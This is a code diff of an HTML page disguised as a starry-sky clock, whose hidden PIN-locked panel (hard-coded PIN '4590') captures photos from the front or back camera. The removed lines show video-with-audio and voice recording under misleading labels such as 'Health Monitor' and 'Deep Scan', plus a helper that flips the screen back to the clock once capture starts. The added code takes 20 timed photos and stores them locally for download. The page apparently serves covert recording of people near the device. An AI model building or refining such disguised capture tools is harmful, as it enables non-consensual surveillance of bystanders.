@@ -5,268 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roman Studio System</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            background: #000; 
-            color: white; 
-            margin: 0; 
-            overflow: hidden; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            position: relative; 
-        }
-        #stars { 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            z-index: -2; 
-        }
-        
-        /* لاک اسکرین اور اسٹیٹس میسج */
-        #clock-screen { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            width: 100%; 
-            height: 100%; 
-            cursor: pointer; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            z-index: 999; 
-            background: rgba(0, 0, 0, 0.7); 
-            backdrop-filter: blur(5px); 
-        }
-        #complete-msg { 
-            position: absolute; 
-            top: 50px; 
-            color: #2ecc71; 
-            font-weight: bold; 
-            font-size: 20px; 
-            letter-spacing: 2px; 
-            display: none; 
-            text-shadow: 0 0 10px #2ecc71; 
-            z-index: 1001; 
-            animation: blink 2s infinite; 
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .clock { 
-            width: 250px; 
-            height: 250px; 
-            border: 8px solid #1a1a1a; 
-            border-radius: 50%; 
-            position: relative; 
-            background: rgba(5, 5, 5, 0.8); 
-            box-shadow: 0 0 50px rgba(52, 152, 219, 0.3); 
-        }
-        .hand { 
-            position: absolute; 
-            bottom: 50%; 
-            left: 50%; 
-            transform-origin: bottom; 
-            border-radius: 10px; 
-            transition: transform 0.05s cubic-bezier(0.4, 2.3, 0.8, 1); 
-        }
-        .hour { 
-            width: 6px; 
-            height: 50px; 
-            background: white; 
-            z-index: 3; 
-        }
-        .minute { 
-            width: 4px; 
-            height: 80px; 
-            background: #888; 
-            z-index: 2; 
-        }
-        .second { 
-            width: 2px; 
-            height: 95px; 
-            background: #e74c3c; 
-            z-index: 1; 
-        }
-        .roman-text { 
-            margin-top: 30px; 
-            font-size: 22px; 
-            color: #3498db; 
-            animation: glow 3s infinite alternate; 
-            font-weight: bold; 
-        }
-        @keyframes glow {
-            from { text-shadow: 0 0 5px #3498db; }
-            to { text-shadow: 0 0 20px #3498db, 0 0 30px #2980b9; }
-        }
-        
-        #pin-screen { 
-            display: none; 
-            text-align: center; 
-            width: 100%; 
-            height: 100vh; 
-            background: rgba(0, 0, 0, 0.9); 
-            position: fixed; 
-            top: 0; 
-            z-index: 1000; 
-            padding-top: 25vh; 
-            backdrop-filter: blur(10px); 
-        }
-        input { 
-            padding: 15px; 
-            font-size: 28px; 
-            width: 140px; 
-            text-align: center; 
-            background: rgba(17, 17, 17, 0.8); 
-            color: white; 
-            border: 1px solid #333; 
-            border-radius: 12px; 
-            outline: none; 
-            margin-top: 20px; 
-        }
-        
-        #admin-panel { 
-            display: none; 
-            padding: 20px; 
-            width: 100%; 
-            height: 100vh; 
-            overflow-y: auto; 
-            background: rgba(0, 0, 0, 0.9); 
-            position: fixed; 
-            top: 0; 
-            z-index: 998; 
-            box-sizing: border-box; 
-        }
-        .btn { 
-            width: 100%; 
-            max-width: 320px; 
-            padding: 15px; 
-            margin: 8px auto; 
-            border: none; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            color: white; 
-            display: block; 
-            text-transform: uppercase; 
-            transition: all 0.3s; 
-        }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        .btn-blue { 
-            background: linear-gradient(135deg, #2c3e50, #34495e); 
-            border: 1px solid #3498db; 
-        }
-        .btn-green { 
-            background: linear-gradient(135deg, #27ae60, #2ecc71); 
-            border: 1px solid #2ecc71; 
-        }
-        .btn-orange { 
-            background: linear-gradient(135deg, #d35400, #e67e22); 
-            border: 1px solid #e67e22; 
-        }
-        .btn-purple { 
-            background: linear-gradient(135deg, #8e44ad, #9b59b6); 
-            border: 1px solid #9b59b6; 
-        }
-        .btn-red { 
-            background: linear-gradient(135deg, #c0392b, #e74c3c); 
-            border: 1px solid #e74c3c; 
-        }
-        .btn-voice { 
-            background: linear-gradient(135deg, #16a085, #1abc9c); 
-            border: 1px solid #1abc9c; 
-        }
-        .btn-gray { 
-            background: linear-gradient(135deg, #7f8c8d, #95a5a6); 
-            border: 1px solid #95a5a6; 
-        }
-        
-        .sub-menu { 
-            display: none; 
-            background: rgba(10, 10, 10, 0.8); 
-            padding: 10px; 
-            border-radius: 12px; 
-            margin-bottom: 10px; 
-        }
-        .gallery { 
-            display: none; 
-            grid-template-columns: 1fr 1fr; 
-            gap: 12px; 
-            margin-top: 25px; 
-        }
-        .card { 
-            background: rgba(17, 17, 17, 0.8); 
-            padding: 8px; 
-            border-radius: 12px; 
-            border: 1px solid #222; 
-            text-align: center; 
-            position: relative;
-        }
-        .card img, .card video, .card audio { 
-            width: 100%; 
-            border-radius: 8px; 
-        }
-        .gallery-controls {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .gallery-controls .btn {
-            max-width: 150px;
-            padding: 10px;
-        }
-        
-        /* بیک بٹن اسٹائل */
-        .back-btn {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(52, 152, 219, 0.3);
-            color: white;
-            border: 1px solid #3498db;
-            border-radius: 8px;
-            padding: 10px 20px;
-            cursor: pointer;
-            z-index: 1002;
-            transition: all 0.3s;
-        }
-        .back-btn:hover {
-            background: rgba(52, 152, 219, 0.5);
-        }
-        
-        /* پروگریس بار */
-        .progress-container {
-            width: 100%;
-            max-width: 320px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            margin: 10px auto;
-            display: none;
-        }
-        .progress-bar {
-            height: 8px;
-            background: linear-gradient(90deg, #3498db, #2ecc71);
-            border-radius: 10px;
-            width: 0%;
-            transition: width 0.3s;
-        }
+        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; position: relative; }
+        #stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; }
+        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top: 0; left: 0; z-index: 999; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); }
+        #complete-msg { position: absolute; top: 50px; color: #2ecc71; font-weight: bold; font-size: 20px; letter-spacing: 2px; display: none; text-shadow: 0 0 10px #2ecc71; z-index: 1001; animation: blink 2s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: rgba(5, 5, 5, 0.8); box-shadow: 0 0 50px rgba(52, 152, 219, 0.3); }
+        .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; }
+        .hour { width: 6px; height: 50px; background: white; z-index: 3; }
+        .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
+        .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
+        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; font-weight: bold; text-shadow: 0 0 10px #3498db; }
+        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: rgba(0, 0, 0, 0.9); position: fixed; top: 0; z-index: 1000; padding-top: 25vh; backdrop-filter: blur(10px); }
+        input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }
+        #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
+        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
+        .btn-blue { background: #2c3e50; border: 1px solid #3498db; }
+        .btn-green { background: #27ae60; }
+        .btn-purple { background: #8e44ad; }
+        .btn-red { background: #c0392b; }
+        .sub-menu { display: none; background: #111; padding: 10px; border-radius: 12px; margin-bottom: 10px; }
+        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
+        .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
+        .card img { width: 100%; border-radius: 8px; }
+        .back-btn { position: absolute; top: 20px; left: 20px; background: rgba(52, 152, 219, 0.3); color: white; border: 1px solid #3498db; padding: 10px 20px; cursor: pointer; z-index: 1002; display: none; }
+        .progress-container { width: 100%; max-width: 320px; background: #222; border-radius: 10px; margin: 10px auto; display: none; height: 10px; overflow: hidden; }
+        .progress-bar { height: 100%; background: #3498db; width: 0%; transition: width 0.3s; }
     </style>
 </head>
 <body>
     <canvas id="stars"></canvas>
-
-    <!-- بیک بٹن -->
-    <button class="back-btn" onclick="goBackToClock()" style="display: none;">← Back</button>
+    <button class="back-btn" id="main-back" onclick="goBackToClock()">← Back</button>
 
     <div id="clock-screen" onclick="openPin()">
         <div id="complete-msg">COMPLETE</div>
@@ -281,482 +50,123 @@
     <div id="pin-screen">
         <h3>System Access</h3>
         <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
-        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
     </div>
 
     <div id="admin-panel">
-        <h3 style="text-align:center; color:#3498db;">HEALTH MONITOR</h3>
+        <h3 style="text-align:center; color:#3498db;">PHOTO MONITOR</h3>
+        <div class="progress-container" id="prog-cont"><div class="progress-bar" id="prog-bar"></div></div>
         
-        <!-- پروگریس بار -->
-        <div id="progress-container" class="progress-container">
-            <div id="progress-bar" class="progress-bar"></div>
-        </div>
-        
-        <video id="preview" autoplay playsinline muted style="display:none;"></video>
+        <video id="preview" autoplay playsinline muted style="display:none; width:100%; max-width:320px; margin: 0 auto; border-radius:10px;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Settings</button>
+        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Camera</button>
         <div id="front-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhotoSeries('user')">Start Analysis</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('user')">Deep Scan</button>
+            <button class="btn btn-green" onclick="startCapture('user')">Start 20 Photos</button>
         </div>
 
-        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Settings</button>
+        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Camera</button>
         <div id="back-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhotoSeries('environment')">Start Analysis</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Deep Scan</button>
+            <button class="btn btn-green" onclick="startCapture('environment')">Start 20 Photos</button>
         </div>
 
-        <!-- وائس ریکارڈنگ بٹن -->
-        <button class="btn btn-voice" onclick="startVoiceRecording()">Voice Record</button>
+        <button class="btn btn-purple" onclick="updateGallery()">Refresh Gallery</button>
+        <div class="gallery" id="gallery"></div>
 
-        <button class="btn btn-purple" onclick="toggleGallery()">Gallery</button>
-        <button class="btn btn-red" onclick="lockSystem()">Lock</button>
-        
-        <!-- گیلری کنٹرولز -->
-        <div id="gallery" class="gallery"></div>
-        <div class="gallery-controls" style="display: none;" id="gallery-controls">
-            <button class="btn btn-green" onclick="downloadAll()">All Download</button>
-            <button class="btn btn-red" onclick="deleteAll()">All Delete</button>
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button class="btn btn-green" onclick="downloadAll()">Download All</button>
+            <button class="btn btn-red" onclick="deleteAll()">Clear All</button>
         </div>
     </div>
 
     <script>
-        // گلوبل ویری ایبلز
-        let currentStream = null;
-        let currentRecorder = null;
-        let audioRecorder = null;
-        let chunks = [];
-        let audioChunks = [];
-        let photoInterval = null;
-        let photoCount = 0;
-        let voiceRecordingTimeout = null;
-        let currentTask = null; // 'photo', 'video', 'voice'
+        let db;
+        const request = indexedDB.open("RomanStudioDB", 2);
+        request.onupgradeneeded = e => {
+            db = e.target.result;
+            if (!db.objectStoreNames.contains("vault")) db.createObjectStore("vault", { keyPath: "id" });
+        };
+        request.onsuccess = e => { db = e.target.result; updateGallery(); };
 
-        // بیک بٹن فنکشن
-        function goBackToClock() {
-            document.getElementById('pin-screen').style.display = 'none';
-            document.getElementById('admin-panel').style.display = 'none';
-            document.getElementById('clock-screen').style.display = 'flex';
-            document.querySelector('.back-btn').style.display = 'none';
-            
-            // پروگریس بار چھپائیں
-            document.getElementById('progress-container').style.display = 'none';
+        let currentStream = null, photoInterval = null, photoCount = 0;
+
+        function openPin() { document.getElementById('pin-screen').style.display = 'block'; document.getElementById('clock-screen').style.display = 'none'; }
+        function goBackToClock() { location.reload(); }
+        function checkPin(v) { if(v === '4590') { document.getElementById('pin-screen').style.display = 'none'; document.getElementById('admin-panel').style.display = 'block'; document.getElementById('main-back').style.display = 'block'; } }
+        function toggleSub(id) { let e = document.getElementById(id); e.style.display = (e.style.display === 'block') ? 'none' : 'block'; }
+
+        async function startCapture(cam) {
+            if (photoInterval) clearInterval(photoInterval);
+            photoCount = 0;
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
+                document.getElementById('preview').srcObject = currentStream;
+                document.getElementById('prog-cont').style.display = 'block';
+
+                photoInterval = setInterval(async () => {
+                    if (photoCount >= 20) {
+                        clearInterval(photoInterval);
+                        currentStream.getTracks().forEach(t => t.stop());
+                        alert("20 Photos Saved Successfully!");
+                        return;
+                    }
+                    takePhoto();
+                    photoCount++;
+                    document.getElementById('prog-bar').style.width = (photoCount / 20) * 100 + '%';
+                }, 10000); // 10 سیکنڈ
+            } catch(e) { alert("Camera Error!"); }
         }
 
-        function lockSystem() {
-            location.reload();
+        function takePhoto() {
+            const c = document.getElementById('canvas'), p = document.getElementById('preview');
+            c.width = p.videoWidth; c.height = p.videoHeight;
+            c.getContext('2d').drawImage(p, 0, 0);
+            const data = c.toDataURL('image/jpeg', 0.7);
+            const entry = { id: Date.now().toString(), d: data, time: new Date().toLocaleString('ur-PK') };
+            const tx = db.transaction("vault", "readwrite");
+            tx.objectStore("vault").add(entry);
+            tx.oncomplete = () => { showComplete(); updateGallery(); };
         }
 
-        function executeAndHide(callback) {
-            callback();
-            setTimeout(() => {
-                goBackToClock();
-                document.getElementById('pinIn').value = '';
-                document.querySelector('.back-btn').style.display = 'block'; // بیک بٹن دکھائیں
-            }, 500);
-        }
-
-        // اسٹیٹس دکھانے کا نیا فنکشن
-        function showComplete() {
-            const msg = document.getElementById('complete-msg');
-            msg.style.display = 'block';
-            setTimeout(() => { msg.style.display = 'none'; }, 3000);
-        }
-
-        // ڈیٹا سیو کرنے کا فنکشن
-        function saveData(type, data, fileName = null) {
-            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            const id = Date.now() + Math.random().toString(36).substr(2, 9);
-            const entry = { 
-                id: id,
-                t: type, 
-                d: data, 
-                time: new Date().toLocaleString('ur-PK'),
-                fileName: fileName || `${type}_${id}.${type === 'img' ? 'jpg' : type === 'vid' ? 'webm' : 'wav'}`
+        function updateGallery() {
+            const store = db.transaction("vault", "readonly").objectStore("vault");
+            store.getAll().onsuccess = e => {
+                const res = e.target.result;
+                document.getElementById('gallery').innerHTML = res.reverse().map(item => `
+                    <div class="card"><img src="${item.d}"><small>${item.time}</small></div>
+                `).join('');
             };
-            storage.push(entry);
-            localStorage.setItem('rvault', JSON.stringify(storage));
-            showComplete();
-            updateGallery();
         }
 
-        // ستاروں کی اینیمیشن
-        function initStars() {
-            const canvas = document.getElementById('stars'); 
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth; 
-            canvas.height = window.innerHeight;
-            
-            const stars = [];
-            for(let i = 0; i < 200; i++) {
-                stars.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    s: Math.random() * 2,
-                    sp: Math.random() * 0.5 + 0.2
-                });
-            }
-            
-            function draw() {
-                ctx.fillStyle = '#000';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                stars.forEach(s => {
-                    s.y += s.sp;
-                    if(s.y > canvas.height) s.y = 0;
-                    ctx.fillStyle = '#fff';
-                    ctx.beginPath();
-                    ctx.arc(s.x, s.y, s.s, 0, Math.PI * 2);
-                    ctx.fill();
-                });
-                
-                requestAnimationFrame(draw);
-            }
-            draw();
+        async function downloadAll() {
+            const store = db.transaction("vault", "readonly").objectStore("vault");
+            store.getAll().onsuccess = async e => {
+                for (let item of e.target.result) {
+                    const a = document.createElement('a'); a.href = item.d; a.download = `RS_${item.id}.jpg`;
+                    a.click(); await new Promise(r => setTimeout(r, 600));
+                }
+            };
         }
 
-        // گھڑی چلانے کا فنکشن
-        function runClock() {
+        function deleteAll() { if(confirm("Delete All?")) { db.transaction("vault", "readwrite").objectStore("vault").clear().onsuccess = () => updateGallery(); } }
+        function showComplete() { const m = document.getElementById('complete-msg'); m.style.display = 'block'; setTimeout(() => m.style.display = 'none', 2000); }
+
+        setInterval(() => {
             const n = new Date();
             document.getElementById('sec').style.transform = `translateX(-50%) rotate(${n.getSeconds() * 6}deg)`;
             document.getElementById('min').style.transform = `translateX(-50%) rotate(${n.getMinutes() * 6}deg)`;
             document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(n.getHours() % 12) * 30 + n.getMinutes() / 2}deg)`;
+        }, 1000);
+
+        // Stars Background
+        const canvas = document.getElementById('stars'); const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const stars = Array(200).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sp: Math.random()*0.5 }));
+        function draw() {
+            ctx.fillStyle = '#000'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle = '#fff';
+            stars.forEach(s => { s.y += s.sp; if(s.y > canvas.height) s.y = 0; ctx.beginPath(); ctx.arc(s.x, s.y, s.s, 0, 7); ctx.fill(); });
+            requestAnimationFrame(draw);
         }
-        setInterval(runClock, 1000);
-
-        // پن اسکرین کھولنا
-        function openPin() { 
-            document.getElementById('pin-screen').style.display = 'block'; 
-            document.getElementById('clock-screen').style.display = 'none'; 
-        }
-
-        // پن چیک کرنا
-        function checkPin(v) { 
-            if(v === '4590') { 
-                document.getElementById('pin-screen').style.display = 'none'; 
-                document.getElementById('admin-panel').style.display = 'block';
-                document.querySelector('.back-btn').style.display = 'block';
-                updateGallery(); 
-            } 
-        }
-
-        // سب مینو ٹوگل کرنا
-        function toggleSub(id) { 
-            let e = document.getElementById(id); 
-            e.style.display = (e.style.display === 'block') ? 'none' : 'block'; 
-        }
-
-        // گیلری ٹوگل کرنا
-        function toggleGallery() { 
-            let g = document.getElementById('gallery'); 
-            let controls = document.getElementById('gallery-controls');
-            
-            if(g.style.display === 'grid') {
-                g.style.display = 'none';
-                controls.style.display = 'none';
-            } else {
-                g.style.display = 'grid';
-                controls.style.display = 'flex';
-                updateGallery();
-            }
-        }
-
-        // پروگریس بار اپڈیٹ کرنا
-        function updateProgress(percentage, text = '') {
-            const container = document.getElementById('progress-container');
-            const bar = document.getElementById('progress-bar');
-            container.style.display = 'block';
-            bar.style.width = percentage + '%';
-        }
-
-        // خودکار تصاویر بنانے کا سلسلہ (ہر 10 سیکنڈ بعد، 8 تصاویر)
-        async function startAutoPhotoSeries(cam) {
-            if (currentTask) {
-                stopCurrentTask();
-            }
-            
-            currentTask = 'photo';
-            photoCount = 0;
-            
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: cam === 'user' ? 'user' : 'environment' } 
-                });
-                
-                document.getElementById('preview').srcObject = currentStream;
-                document.querySelector('.back-btn').style.display = 'block';
-                
-                photoInterval = setInterval(async () => {
-                    if (photoCount >= 8) {
-                        clearInterval(photoInterval);
-                        if (currentStream) {
-                            currentStream.getTracks().forEach(track => track.stop());
-                            currentStream = null;
-                        }
-                        currentTask = null;
-                        updateProgress(0);
-                        return;
-                    }
-                    
-                    await takePhoto();
-                    photoCount++;
-                    updateProgress((photoCount / 8) * 100, `Photos: ${photoCount}/8`);
-                    
-                }, 10000); // ہر 10 سیکنڈ بعد
-                
-                // پہلی تصویر فوراً بنائیں
-                await takePhoto();
-                photoCount++;
-                updateProgress((photoCount / 8) * 100, `Photos: ${photoCount}/8`);
-                
-            } catch(e) { 
-                console.error(e); 
-                alert('Camera access denied or error occurred.');
-            }
-        }
-
-        // ویڈیو ریکارڈنگ (3 منٹ)
-        async function startVideoRecording(cam) {
-            if (currentTask) {
-                stopCurrentTask();
-            }
-            
-            currentTask = 'video';
-            
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: cam === 'user' ? 'user' : 'environment' }, 
-                    audio: true 
-                });
-                
-                document.getElementById('preview').srcObject = currentStream;
-                document.querySelector('.back-btn').style.display = 'block';
-                
-                currentRecorder = new MediaRecorder(currentStream); 
-                chunks = [];
-                
-                currentRecorder.ondataavailable = e => chunks.push(e.data);
-                
-                currentRecorder.onstop = () => {
-                    const b = new Blob(chunks, { type: 'video/webm' });
-                    const r = new FileReader(); 
-                    r.readAsDataURL(b);
-                    r.onloadend = () => saveData('vid', r.result);
-                    
-                    if (currentStream) {
-                        currentStream.getTracks().forEach(track => track.stop());
-                        currentStream = null;
-                    }
-                    currentTask = null;
-                    updateProgress(0);
-                };
-                
-                // پروگریس بار
-                let timeLeft = 180; // 3 منٹ = 180 سیکنڈ
-                updateProgress(0, 'Recording: 3:00');
-                
-                const progressInterval = setInterval(() => {
-                    timeLeft--;
-                    const minutes = Math.floor(timeLeft / 60);
-                    const seconds = timeLeft % 60;
-                    updateProgress(((180 - timeLeft) / 180) * 100, 
-                                 `Recording: ${minutes}:${seconds.toString().padStart(2, '0')}`);
-                    
-                    if (timeLeft <= 0) {
-                        clearInterval(progressInterval);
-                    }
-                }, 1000);
-                
-                currentRecorder.start();
-                
-                // 3 منٹ بعد ریکارڈنگ بند کریں
-                setTimeout(() => { 
-                    if(currentRecorder && currentRecorder.state === "recording") {
-                        clearInterval(progressInterval);
-                        currentRecorder.stop();
-                    }
-                }, 180000);
-                
-            } catch(e) { 
-                console.error(e); 
-                alert('Camera/microphone access denied or error occurred.');
-            }
-        }
-
-        // وائس ریکارڈنگ (6 منٹ)
-        async function startVoiceRecording() {
-            if (currentTask) {
-                stopCurrentTask();
-            }
-            
-            currentTask = 'voice';
-            
-            try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: true 
-                });
-                
-                audioRecorder = new MediaRecorder(audioStream); 
-                audioChunks = [];
-                
-                audioRecorder.ondataavailable = e => audioChunks.push(e.data);
-                
-                audioRecorder.onstop = () => {
-                    const b = new Blob(audioChunks, { type: 'audio/wav' });
-                    const r = new FileReader(); 
-                    r.readAsDataURL(b);
-                    r.onloadend = () => saveData('audio', r.result);
-                    
-                    if (audioStream) {
-                        audioStream.getTracks().forEach(track => track.stop());
-                    }
-                    currentTask = null;
-                    updateProgress(0);
-                };
-                
-                // پروگریس بار
-                let timeLeft = 360; // 6 منٹ = 360 سیکنڈ
-                updateProgress(0, 'Recording: 6:00');
-                
-                const progressInterval = setInterval(() => {
-                    timeLeft--;
-                    const minutes = Math.floor(timeLeft / 60);
-                    const seconds = timeLeft % 60;
-                    updateProgress(((360 - timeLeft) / 360) * 100, 
-                                 `Recording: ${minutes}:${seconds.toString().padStart(2, '0')}`);
-                    
-                    if (timeLeft <= 0) {
-                        clearInterval(progressInterval);
-                    }
-                }, 1000);
-                
-                audioRecorder.start();
-                
-                // 6 منٹ بعد ریکارڈنگ بند کریں
-                voiceRecordingTimeout = setTimeout(() => { 
-                    if(audioRecorder && audioRecorder.state === "recording") {
-                        clearInterval(progressInterval);
-                        audioRecorder.stop();
-                    }
-                }, 360000);
-                
-            } catch(e) { 
-                console.error(e); 
-                alert('Microphone access denied or error occurred.');
-            }
-        }
-
-        // تصویر بنانے کا فنکشن
-        function takePhoto() {
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    const c = document.getElementById('canvas'); 
-                    const p = document.getElementById('preview');
-                    if (!p.videoWidth) {
-                        resolve();
-                        return;
-                    }
-                    
-                    c.width = p.videoWidth; 
-                    c.height = p.videoHeight;
-                    c.getContext('2d').drawImage(p, 0, 0);
-                    saveData('img', c.toDataURL('image/jpeg'));
-                    resolve();
-                }, 100);
-            });
-        }
-
-        // موجودہ ٹاسک روکنے کا فنکشن
-        function stopCurrentTask() {
-            if (currentTask === 'photo' && photoInterval) {
-                clearInterval(photoInterval);
-                photoCount = 0;
-            }
-            
-            if (currentTask === 'video' && currentRecorder && currentRecorder.state === "recording") {
-                currentRecorder.stop();
-            }
-            
-            if (currentTask === 'voice' && audioRecorder && audioRecorder.state === "recording") {
-                audioRecorder.stop();
-                if (voiceRecordingTimeout) {
-                    clearTimeout(voiceRecordingTimeout);
-                }
-            }
-            
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-            
-            currentTask = null;
-            updateProgress(0);
-        }
-
-        // گیلری اپڈیٹ کرنا
-        function updateGallery() {
-            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            const gallery = document.getElementById('gallery');
-            
-            if (storage.length === 0) {
-                gallery.innerHTML = '<p style="grid-column: span 2; text-align: center; color: #666;">No media found</p>';
-                return;
-            }
-            
-            gallery.innerHTML = storage.reverse().map((item, i) => `
-                <div class="card">
-                    ${item.t === 'img' ? 
-                        `<img src="${item.d}" alt="Photo ${i+1}">` : 
-                      item.t === 'vid' ? 
-                        `<video src="${item.d}" controls></video>` :
-                      item.t === 'audio' ?
-                        `<audio src="${item.d}" controls></audio><p style="margin:5px 0; color:#1abc9c;">Voice Recording</p>` :
-                        ''
-                    }
-                    <small style="color:#888; display:block; margin-top:5px;">${item.time}</small>
-                </div>
-            `).join('');
-        }
-
-        // تمام ڈیٹا ڈاؤنلوڈ کرنا
-        function downloadAll() {
-            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            
-            if (storage.length === 0) {
-                alert('No media to download');
-                return;
-            }
-            
-            storage.forEach((item, index) => {
-                const link = document.createElement('a');
-                link.href = item.d;
-                link.download = item.fileName || `${item.t}_${index}.${item.t === 'img' ? 'jpg' : item.t === 'vid' ? 'webm' : 'wav'}`;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            });
-            
-            alert(`${storage.length} files downloaded successfully`);
-        }
-
-        // تمام ڈیٹا ڈیلیٹ کرنا
-        function deleteAll() {
-            if (confirm('Are you sure you want to delete ALL media? This action cannot be undone.')) {
-                localStorage.removeItem('rvault');
-                updateGallery();
-                alert('All media deleted successfully');
-            }
-        }
-
-        // ونڈو لوڈ ہونے پر انیشیلائزیشن
-        window.onload = () => { 
-            initStars(); 
-            runClock(); 
-        };
-
-        // ونڈو ریسائز پر ستاروں کو اپڈیٹ کریں
-        window.onresize = initStars;
+        draw();
     </script>
 </body>
 </html>
